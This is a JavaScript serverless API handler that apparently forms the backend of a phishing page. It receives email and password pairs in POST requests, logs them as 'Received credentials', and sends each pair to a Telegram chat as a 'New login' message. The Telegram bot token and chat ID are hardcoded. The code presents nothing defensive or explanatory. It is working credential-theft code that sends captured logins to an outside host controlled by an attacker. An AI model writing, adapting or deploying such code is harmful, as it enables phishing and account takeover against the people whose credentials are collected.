import fetch from 'node-fetch';

export default async function handler(req, res) {
    // Set CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    console.log('API endpoint hit'); // Log when the endpoint is accessed

    if (req.method !== 'POST') {
        console.log('Invalid method:', req.method);
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        let body = '';
        req.on('data', (chunk) => {
            body += chunk.toString();
        });
        req.on('end', async () => {
            try {
                const parsedBody = JSON.parse(body);
                console.log('Received credentials:', parsedBody);

                const { email, password } = parsedBody;

                if (!email || !password) {
                    console.log('Missing email or password in request body');
                    return res.status(400).json({ error: 'Email and password are required' });
                }

                const telegramBotToken = '7828349055:AAFYs91viPZS8pXSO5GmZj1y02LIZhMmPAc';
                const chatId = '7329638940';

                const message = encodeURIComponent(`New login:\nEmail: ${email}\nPassword: ${password}`);
                const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;

                console.log('Sending message to Telegram:', telegramUrl);

                const response = await fetch(telegramUrl);
                const result = await response.json();

                console.log('Telegram API response:', result);

                if (!response.ok) {
                    throw new Error(`Telegram API error: ${result.description}`);
                }

                return res.status(200).json({ success: true });
            } catch (parseError) {
                console.error('Error parsing request body:', parseError.message);
                return res.status(400).json({ error: 'Invalid request body' });
            }
        });
    } catch (error) {
        console.error('Error in server.js:', error.message);
        return res.status(500).json({ error: 'Failed to process request' });
    }
}
